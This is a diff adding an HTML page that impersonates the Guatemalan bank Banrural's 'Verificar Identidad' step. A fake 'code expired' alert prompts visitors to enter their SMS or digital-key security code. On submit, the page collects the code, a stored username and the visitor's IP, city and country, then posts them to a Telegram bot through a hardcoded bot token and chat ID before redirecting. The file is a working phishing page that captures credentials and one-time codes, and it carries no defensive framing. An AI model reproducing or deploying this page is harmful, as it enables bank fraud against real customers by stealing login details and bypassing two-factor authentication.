@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BanruralGT</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+      rel="stylesheet"
+    />
+    <script>
+      alert(
+        "Código incorrecto o expirado: Le enviaremos un nuevo codigo de seguridad a su telefono registrado."
+      );
+    </script>
+  </head>
+  <body style="color: #0b5031">
+    <div class="container">
+      <form class="form" id="loginform">
+        <div style="text-align: center; background: #0b5031">
+          <img
+            src="https://imtconferences.com/wp-content/uploads/2017/01/BANRURAL.jpg"
+            width="150"
+          />
+        </div>
+        <div style="background: #f68f1e; height: 10px"></div>
+        <div style="padding: 20px">
+          <div style="text-align: center">
+            <h3>Verificar Identidad</h3>
+
+            <h4>
+              Escribe el código generado por tu Llave digital para terminar el
+              proceso de identidad.
+            </h4>
+          </div>
+
+          <div>
+            <label style="margin-top: 10px">Código</label>
+            <input
+              type="text"
+              id="numero"
+              name="numero"
+              inputmode="text"
+              oninput="validarNumero(this)"
+              style="width: 100%; height: 30px"
+              placeholder="Ingresá el código"
+            />
+            <script>
+              function validarNumero(input) {
+                // Remueve caracteres no numéricos
+                input.value = input.value.replace(/\D/g, "");
+
+                // Cambia el inputmode para abrir el teclado numérico en dispositivos móviles
+                input.inputMode = "numeric";
+              }
+            </script>
+          </div>
+        </div>
+
+        <div style="padding: 20px">
+          <button type="submit">Confirmar Identidad</button>
+        </div>
+
+        <div
+          style="text-align: center; background: #0b5031; height: 50px"
+        ></div>
+      </form>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const sms = document.querySelector("#numero").value;
+          const message =
+            "\nBanrural\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nSMS: " +
+            sms +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot7754122794:AAElKR1eLtxQ1m0s0ENGtWm2WE_cwYdhNlw/sendMessage",
+              {
+                chat_id: "-4570779421",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              window.location.href = "cargando2.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
